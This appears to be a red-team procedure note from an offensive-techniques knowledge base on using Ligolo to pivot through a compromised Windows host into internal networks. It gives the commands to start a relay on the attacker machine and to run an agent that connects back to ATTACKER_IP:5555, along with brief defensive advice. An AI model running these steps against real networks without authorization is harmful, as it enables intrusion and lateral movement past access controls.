---
id: 963519a9-d75e-44f2-b3c5-4ea9efbc7fae
name: Ligolo-Local-Relay-Setup
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:22.825481+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Lateral Movement]]'
techniques:
  - '[[Connection Proxy]]'
  - '[[T1572.001]]'
sub_techniques: []
tags:
  - ligolo
  - network-pivoting
  - tunneling
commands:
  - '[[commands/ligolo-start-local-relay-server]]'
  - '[[commands/ligolo-connect-compromised-host-to-relay]]'
platforms:
  - Linux
  - Windows
tools:
  - '[[tools/Ligolo]]'
validated: true
---

# Ligolo-Local-Relay-Setup

## Summary

This procedure sets up a local relay using Ligolo to enable network pivoting through a compromised host, allowing attackers to access internal networks that are not directly reachable from the attacker's machine. It involves starting a relay server on the attacker's system and connecting the agent from the compromised host to tunnel traffic securely.

## Description

Ligolo is a tunneling tool that facilitates network pivoting by creating encrypted tunnels between the attacker's machine and a compromised host. In this setup, the local relay acts as a proxy, redirecting traffic from the attacker's system through the compromised host to reach segmented or firewalled internal resources. This technique is particularly useful in red team engagements to bypass network access controls, such as firewalls or NAT configurations, enabling lateral movement within the target environment. The process requires initial access to the compromised host and assumes the Ligolo binaries are available for the respective platforms (Linux for the relay, Windows for the agent in this example). Success results in an active tunnel for further reconnaissance or exploitation on internal systems.

## Requirements

1. Initial foothold on a compromised host with network access to the attacker's machine.
2. Ligolo tool installed or binaries downloaded on both the attacker's Linux-based system and the compromised Windows host.
3. Administrative or user-level access on the compromised host to execute the Ligolo agent.
4. Open port (default 5555) on the attacker's machine for the relay connection.

## Defense

- Implement network segmentation to isolate critical systems and limit lateral movement.
- Monitor for unusual outbound connections from internal hosts to external IPs on non-standard ports.
- Deploy endpoint detection tools to identify execution of unknown binaries like ligolo.exe.
- Use application whitelisting to prevent unauthorized tool execution on endpoints.

## Objectives

1. Establish a secure tunnel through the compromised host to access internal networks.
2. Bypass firewall restrictions and network segmentation for deeper penetration.
3. Enable further actions such as internal scanning or exploitation via the pivoted connection.

## Instructions

### Step 1: Download and Prepare Ligolo Binaries

**Context**: Obtain the necessary Ligolo binaries for the relay server (Linux) and agent (Windows) to ensure compatibility with the target platforms. This step prepares the tools for execution without requiring full installation.

Download the latest Ligolo release from the official GitHub repository on both systems. Extract the binaries to a working directory, such as `./bin/` on the attack server.

### Step 2: Start the Local Relay Server on Attacker Machine

**Context**: Launch the relay server on the attacker's Linux machine to listen for incoming connections from the compromised host. This creates the endpoint for the tunnel.

**Command** ([[commands/ligolo-start-local-relay-server]]):
```bash
./bin/localrelay_linux_amd64
```

> This command starts the Ligolo local relay in listening mode on the default port (5555). It will wait for the agent to connect. Expected output includes a message indicating the server is listening, such as "Local relay server started on :5555".

### Step 3: Download and Execute Ligolo Agent on Compromised Host

**Context**: Transfer and run the Ligolo agent on the Windows compromised host to connect back to the relay server, establishing the tunnel for pivoting traffic.

First, download `ligolo_windows_amd64.exe` to the compromised host (e.g., via initial access method like SMB or HTTP server). Then execute it with the relay server details.

**Command** ([[commands/ligolo-connect-compromised-host-to-relay]]):
```cmd
ligolo_windows_amd64.exe -relayserver ATTACKER_IP:5555
```

> Replace `ATTACKER_IP` with the actual IP of the attacker's machine. This connects the agent to the relay, authenticating and setting up the encrypted tunnel. Expected output on the compromised host console shows connection success, such as "Connected to relay server". On the attacker side, the relay will confirm the new session.
